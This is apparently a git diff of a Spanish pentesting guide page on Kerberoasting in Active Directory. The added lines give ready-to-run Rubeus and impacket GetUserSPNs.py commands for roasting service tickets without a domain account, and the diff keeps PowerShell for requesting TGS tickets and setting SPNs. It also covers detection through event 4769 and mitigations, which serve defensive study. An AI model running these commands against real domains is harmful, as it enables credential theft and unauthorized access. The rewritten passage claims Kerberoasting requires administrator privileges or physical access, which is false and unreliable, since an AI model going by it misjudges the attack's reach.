@@ -63,19 +63,13 @@ Get-NetUser -SPN | select serviceprincipalname #Powerview
 ```
 * **Técnica 1: Solicitar TGS y extraerlo de la memoria**
 
-En esta técnica, el objetivo es solicitar un Service Ticket (TGS) a un servidor de dominio y luego extraerlo de la memoria del sistema. El TGS contiene información sensible, como la clave de sesión del servicio, que puede ser utilizada para realizar ataques de fuerza bruta y obtener acceso no autorizado a la cuenta de servicio correspondiente. A continuación se detallan los pasos para llevar a cabo esta técnica:
+En esta técnica, el objetivo es solicitar un Service Ticket (TGS) a un servidor de dominio y luego extraerlo de la memoria del sistema. El TGS contiene información sensible, como la clave de sesión del servicio, que puede ser utilizada para realizar ataques de fuerza bruta y obtener las contraseñas de los usuarios.
 
-1. Identificar el servicio objetivo: Primero, es necesario identificar el servicio de destino al que se desea acceder. Esto se puede hacer mediante el escaneo de la red o mediante la enumeración de servicios en el dominio.
+Para llevar a cabo esta técnica, se pueden utilizar herramientas como Mimikatz o Rubeus. Estas herramientas permiten solicitar un TGS para un servicio específico y luego extraerlo de la memoria del sistema. Una vez que se ha obtenido el TGS, se puede utilizar para realizar ataques de fuerza bruta y obtener la contraseña del servicio.
 
-2. Solicitar un TGS: Una vez identificado el servicio objetivo, se debe solicitar un TGS al servidor de dominio correspondiente. Esto se logra enviando una solicitud de autenticación Kerberos al servidor.
+Es importante tener en cuenta que esta técnica requiere privilegios de administrador en el sistema objetivo, ya que es necesario acceder a la memoria del sistema para extraer el TGS. Además, es posible que se requiera acceso físico al sistema o privilegios de red para solicitar el TGS al servidor de dominio.
 
-3. Extraer el TGS de la memoria: Una vez que se ha obtenido el TGS, se debe extraer de la memoria del sistema. Esto se puede lograr utilizando herramientas como Mimikatz, que permiten buscar y extraer información sensible de la memoria.
-
-4. Descifrar la clave de sesión: Una vez que se ha extraído el TGS, se puede intentar descifrar la clave de sesión del servicio. Esto se puede hacer utilizando técnicas de fuerza bruta o mediante el uso de diccionarios de contraseñas.
-
-5. Utilizar la clave de sesión: Una vez que se ha descifrado la clave de sesión, se puede utilizar para autenticarse como el servicio correspondiente. Esto puede permitir el acceso no autorizado a recursos protegidos por el servicio.
-
-Es importante tener en cuenta que esta técnica requiere privilegios de administrador en el sistema objetivo y puede ser detectada por soluciones de seguridad que monitorean la memoria del sistema en busca de actividades sospechosas. Por lo tanto, se recomienda utilizar esta técnica con precaución y solo en entornos controlados y autorizados.
+Para protegerse contra esta técnica, se recomienda implementar medidas de seguridad como la limitación de privilegios de administrador, el monitoreo de eventos de seguridad y la implementación de soluciones de detección de ataques de fuerza bruta. Además, es importante mantener el sistema operativo y las aplicaciones actualizadas para mitigar posibles vulnerabilidades que puedan ser explotadas en esta técnica.
 ```powershell
 #Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel
@@ -137,7 +131,7 @@ Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whatever
 ```
 Puedes encontrar herramientas útiles para ataques de **kerberoast** aquí: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Si encuentras este **error** desde Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, se debe a la hora local, necesitas sincronizar el host con el DC. Hay algunas opciones:
+Si encuentras este **error** desde Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW (Demasiada diferencia de tiempo)`**, se debe a la hora local, necesitas sincronizar el host con el DC. Hay algunas opciones:
 
 * `ntpdate <IP del DC>` - Obsoleto a partir de Ubuntu 16.04
 * `rdate -n <IP del DC>`
@@ -146,7 +140,7 @@ Si encuentras este **error** desde Linux: **`Kerberos SessionError: KRB_AP_ERR_S
 
 Kerberoast es muy sigiloso si es explotable
 
-* Evento de seguridad ID 4769: se solicitó un ticket de Kerberos
+* Evento de seguridad ID 4769 - Se solicitó un ticket de Kerberos
 * Dado que 4769 es muy frecuente, vamos a filtrar los resultados:
 * El nombre del servicio no debe ser krbtgt
 * El nombre del servicio no debe terminar con $ (para filtrar las cuentas de máquina utilizadas para servicios)
@@ -158,6 +152,28 @@ Kerberoast es muy sigiloso si es explotable
 * Utilizar cuentas de servicio administradas (cambio automático de contraseña periódicamente y gestión delegada de SPN)
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
+```
+## Kerberoast sin cuenta de dominio
+
+En septiembre de 2022 se descubrió una vulnerabilidad por [Charlie Clark](https://exploit.ph/), los ST (Service Tickets) se pueden obtener a través de una solicitud KRB_AS_REQ sin tener que controlar ninguna cuenta de Active Directory. Si un principal puede autenticarse sin pre-autenticación (como en el ataque AS-REP Roasting), es posible utilizarlo para lanzar una solicitud **KRB_AS_REQ** y engañar a la solicitud para que solicite un **ST** en lugar de un **TGT** encriptado, modificando el atributo **sname** en la parte del cuerpo de la solicitud.
+
+La técnica se explica completamente en este artículo: [Entrada de blog de Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
+
+{% hint style="warning" %}
+Debes proporcionar una lista de usuarios porque no tenemos una cuenta válida para consultar el LDAP utilizando esta técnica.
+{% endhint %}
+
+#### Linux
+
+* [impacket/GetUserSPNs.py de PR #1413](https://github.com/fortra/impacket/pull/1413):
+```bash
+GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
+```
+#### Windows
+
+* [GhostPack/Rubeus desde PR #139](https://github.com/GhostPack/Rubeus/pull/139):
+```bash
+Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
 **Más información sobre Kerberoasting en ired.team** [**aquí**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**y** [**aquí**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**.**
 
